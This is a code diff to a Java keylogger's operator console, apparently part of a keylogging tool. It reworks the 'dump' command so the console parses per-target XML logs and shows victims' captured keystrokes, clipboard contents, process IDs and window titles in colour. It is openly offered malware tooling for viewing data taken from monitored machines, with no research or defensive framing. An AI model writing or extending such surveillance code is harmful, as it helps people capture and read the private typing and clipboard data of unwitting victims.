@@ -7,10 +7,15 @@ package keyloggerinterface;
 import java.awt.Frame;
 import java.io.File;
 import java.io.IOException;
-import java.nio.file.Files;
 import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NodeList;
+import org.xml.sax.SAXException;
 
 
 /**
@@ -31,14 +36,15 @@ public class KeyLoggerInterface extends Frame{
                // System.out.printf("here  %d \n",  IPaddress);
             }
     }    
-
+    public native void setConsoleColorDefault();
+    public native void setConsoleColorCaptureInformationCB();
+    public native void setConsoleColorProcessInformation();
+    public native void setConsoleColorTitleInformation();
+    public native void setConsoleColorCaptureInformationKL();
     public native keylogdata[] getBuffer();
-    private keylogdata[] connections;
     
-    /**
-     * 
-     * @return 
-     */
+    private keylogdata[] connections;
+
     public void raiseConsole()
     {
         
@@ -77,30 +83,116 @@ public class KeyLoggerInterface extends Frame{
                                 + "to see the id of all connected use the 'display' command");
                         break;
                     }
+                    int id;
                     try
                     {
-                        int id = Integer.parseInt(commandStore.split(" ")[1]);
+                         id = Integer.parseInt(commandStore.split(" ")[1]);
                          if(connections == null || id<0 || id>connections.length-1 )
                          {
                              System.err.println("the id you provided is invalid, to get the id# of connected targets run the 'display' command!");
                              break;
                          }
-                    System.out.println("dumping the logs of the specified IP\n");
-                    System.out.printf("%s, %d\n", connections[id].Fname, connections[id].Fname.length());
-                    File f = new File(connections[id].Fname);
-                    byte[] fbytes = Files.readAllBytes(f.toPath());
-                    String fstr = new String(fbytes);
-                    System.out.print(fstr);
-                    }
+                    }   
                     catch ( NumberFormatException e)
                     { 
                         System.err.println("invaild option: \n\n\tusage: dump <ID#>\n\nplease provide the identifier of the log you are trying to access\n"
                                 + "to see the id of all connected use the 'display' command.\n\n example:\n\tdump 3");
-                       
                         break;
-                    } catch (IOException ex) {
-                Logger.getLogger(KeyLoggerInterface.class.getName()).log(Level.SEVERE, null, ex);
-            }
+                    }
+                    File f;
+                  f = new File(connections[id].Fname);
+                  Document doc;
+                try {
+                    doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(f);
+                    Element element = doc.getDocumentElement();
+                    if(element != null)
+                    {
+                        NodeList nodes = element.getChildNodes();
+                        for(int x=0; x<nodes.getLength(); x++)
+                        {
+                            if(nodes.item(x).getNodeName().compareTo("#text")!=0)
+                            {
+                              NodeList ProcessNodes = nodes.item(x).getChildNodes();
+                              for(int y=0; y<ProcessNodes.getLength(); y++)
+                              {
+                                   if(ProcessNodes.item(y).getNodeName().compareTo("ProcessHandle")==0)
+                                    {
+                                        setConsoleColorProcessInformation();
+                                        System.out.print("Process Handle: "+ProcessNodes.item(y).getTextContent());
+                                        setConsoleColorDefault();
+                                    }
+                                   else if(ProcessNodes.item(y).getNodeName().compareTo("ProcessID")==0)
+                                    {
+                                        setConsoleColorProcessInformation();
+                                        System.out.println("\tProcess ID: "+ProcessNodes.item(y).getTextContent());
+                                        setConsoleColorDefault();
+                                    }
+                                   else if(ProcessNodes.item(y).getNodeName().compareTo("title")==0)
+                                    {
+                                        System.out.print("\n");
+                                        NodeList TitleList = ProcessNodes.item(y).getChildNodes();
+                                        for(int z=0; z<TitleList.getLength(); z++)
+                                        {
+                                            if(TitleList.item(z).getNodeName().compareTo("ProcessTitle")==0)
+                                            {
+                                                
+                                                 setConsoleColorTitleInformation();
+                                                System.out.print("Title: "+TitleList.item(z).getTextContent());
+                                                 setConsoleColorDefault();
+                                            }
+                                            else if(TitleList.item(z).getNodeName().compareTo("TimeStamp")==0)
+                                            {
+                                                
+                                                 setConsoleColorTitleInformation();
+                                                 System.out.println("Time Stamp: "+TitleList.item(z).getTextContent());
+                                                 setConsoleColorDefault();
+                                            }
+                                            else if (TitleList.item(z).getNodeName().compareTo("logged")==0)
+                                            {
+                                                 NodeList LoggedList = TitleList.item(z).getChildNodes();
+                                                 
+                                                 for(int x1=0; x1<LoggedList.getLength();x1++)
+                                                 {
+                                                     if (LoggedList.item(x1).getNodeName().compareTo("CaptureType")==0)
+                                                     {
+                                                         if(LoggedList.item(x1).getTextContent().compareTo("Keylogger")==0)
+                                                         {
+                                                             setConsoleColorCaptureInformationKL();
+                                                         }
+                                                         else if(LoggedList.item(x1).getTextContent().compareTo("ClipBoard")==0)
+                                                         {
+                                                             setConsoleColorCaptureInformationCB();
+                                                         }
+                                                         System.out.println(LoggedList.item(x1).getTextContent());
+                                                     }
+                                                     else if (LoggedList.item(x1).getNodeName().compareTo("Capture")==0)
+                                                     {
+                                                         
+                                                         System.out.println("\n"+LoggedList.item(x1).getTextContent()); 
+                                                         setConsoleColorDefault();
+                                                     }
+                                                 }
+                                                
+                                            }
+                                        }
+                                        
+                                    }
+                              }
+                            }
+                        }
+                        System.out.println("\nSuccess\n");
+                    }
+                    else
+                    {
+                        System.out.println("\nfailde\n");
+                    }
+                } catch (SAXException | IOException | ParserConfigurationException ex) {
+                    Logger.getLogger(KeyLoggerInterface.class.getName()).log(Level.SEVERE, null, ex);
+                }
+                    setConsoleColorProcessInformation();
+                   
+                    setConsoleColorDefault();
+          
                     //logic goes here to dump the log of a specified IP address
                
                     
